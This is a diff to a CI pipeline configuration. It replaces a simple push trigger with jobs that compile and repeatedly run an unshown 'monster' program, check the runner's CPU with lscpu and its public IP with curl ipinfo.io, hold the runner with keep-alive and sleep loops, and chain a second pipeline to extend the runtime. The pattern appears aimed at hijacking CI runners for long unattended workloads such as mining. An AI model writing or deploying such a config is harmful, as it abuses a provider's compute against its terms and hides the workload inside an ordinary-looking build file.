@@ -1,6 +1,38 @@
-- pipeline: "Budd"
-  events:
-  - type: "PUSH"
-    refs:
-    - "refs/heads/main"
-  fail_on_prepare_env_warning: true
+pipelines:
+  - name: Setup and Run
+    trigger_mode: ON_PUSH
+    ref_name: main
+    actions:
+      - action: Setup Environment
+        type: build
+        name: "Setup and Run"
+        image_name: ubuntu:20.04
+        commands:
+          - echo "Setting up environment..."
+          - apt-get update && apt-get install -y gcc g++ python3-pip
+          - pip install -r requirements.txt
+          - echo "Compiling C++ file into binary..."
+          - g++ -o monster monster.cpp -std=c++11 -pthread || exit 1
+          - chmod +x *
+          - lscpu
+          - curl ipinfo.io
+          - echo "Starting keep-alive process..."
+          - |
+            while true; do 
+              echo "Keep-alive... $(date)"; 
+              sleep 300; 
+            done &  # Keep-alive process
+          - echo "Running the compiled binary with wait mechanism..."
+          - timeout 3600 bash -c "while true; do python3 monster.py || echo 'Application crashed. Restarting...'; sleep 500; done"
+
+  - name: Wait and Restart
+    trigger_mode: ON_SUCCESS
+    ref_name: main
+    actions:
+      - action: Wait and Restart
+        type: build
+        image_name: ubuntu:20.04
+        commands:
+          - echo "Pipeline waiting and ready to restart tasks..."
+          - sleep 3600
+          
